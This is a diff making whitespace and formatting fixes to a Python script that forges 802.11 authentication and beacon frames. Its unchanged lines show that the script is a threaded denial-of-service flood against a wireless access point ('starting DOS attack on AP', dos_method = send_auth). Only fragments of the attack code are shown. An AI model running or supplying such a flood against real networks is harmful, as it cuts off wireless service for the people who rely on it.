@@ -27,7 +27,7 @@ auth_req_orig	= radiotap.Radiotap() +\
 beacon_orig	= radiotap.Radiotap() +\
 		ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_BEACON, to_ds=0, from_ds=0) +\
 		ieee80211.IEEE80211.Beacon(
-			params=[ieee80211.IEEE80211.IE(id=0, len=10, data=b"\x00"*10),
+			params=[ieee80211.IEEE80211.IE(id=0, len=10, data=b"\x00" * 10),
 				ieee80211.IEEE80211.IE(id=1, len=8, data=b"\x82\x84\x8b\x96\x0c\x12\x18\x24"),
 				ieee80211.IEEE80211.IE(id=3, len=1, data=b"\x04"),
 				ieee80211.IEEE80211.IE(id=5, len=4, data=b"\x00\x01\x00\x00"),
@@ -56,6 +56,7 @@ def send_auth(mac):
 
 import string
 import random
+
 
 def send_beacon(_):
 	"""Send authentications to ap having mac 'mac'"""
@@ -100,7 +101,7 @@ def send_beacon(_):
 print("starting DOS attack on AP %s" % ap_mac)
 amount_threads = 10
 threads = []
-dos_method=send_auth
+dos_method = send_auth
 #dos_method=send_beacon
 
 print("creating threads")
